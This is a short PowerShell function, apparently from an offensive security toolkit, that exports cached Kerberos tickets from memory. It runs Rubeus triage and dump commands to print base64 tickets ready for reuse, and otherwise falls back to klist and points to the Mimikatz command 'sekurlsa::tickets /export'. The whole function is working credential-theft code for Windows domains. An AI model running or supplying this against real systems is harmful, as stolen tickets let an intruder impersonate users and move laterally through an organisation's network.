function Export-AllTickets {
    <#
    .SYNOPSIS
        Export all cached Kerberos tickets from memory.

    .DESCRIPTION
        Lists and dumps all Kerberos tickets in the current session
        using Rubeus (preferred) or falls back to klist and Mimikatz
        guidance. Rubeus /nowrap outputs base64 tickets suitable for
        copy/paste and cross-platform conversion.

    .EXAMPLE
        Export-AllTickets
    #>

    Write-Host "`n[*] Exporting all Kerberos tickets from memory..." -ForegroundColor Cyan

    if (Test-Path ".\Rubeus.exe") {
        Write-Host "[*] Listing cached tickets:" -ForegroundColor Yellow
        & .\Rubeus.exe triage

        Write-Host "`n[*] Dumping all tickets:" -ForegroundColor Yellow
        & .\Rubeus.exe dump /nowrap
    }
    else {
        Write-Host "[*] Using klist:" -ForegroundColor Yellow
        klist

        Write-Host "`n[*] For full dump, use Mimikatz: sekurlsa::tickets /export"
    }
}